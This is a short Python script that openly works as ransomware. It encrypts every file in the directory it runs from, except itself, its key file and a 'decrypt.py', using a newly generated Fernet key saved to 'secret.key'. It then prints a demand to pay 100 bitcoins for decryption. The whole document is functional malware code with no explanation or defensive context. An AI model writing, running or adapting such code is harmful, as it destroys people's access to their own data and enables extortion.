import os
from cryptography.fernet import Fernet

files = list()

for file in os.listdir():
    if file == "virus.py" or file == "secret.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# print(files)

key = Fernet.generate_key()
# print(key)
with open("secret.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file, "rb") as r_file:
        contents = r_file.read()

    contents_encrypted = Fernet(key).encrypt(contents)
    
    with open(file, "wb") as w_file:
        w_file.write(contents_encrypted)

print("Your files have been encrypted. Pay me 100 bitcoins to decrypt.")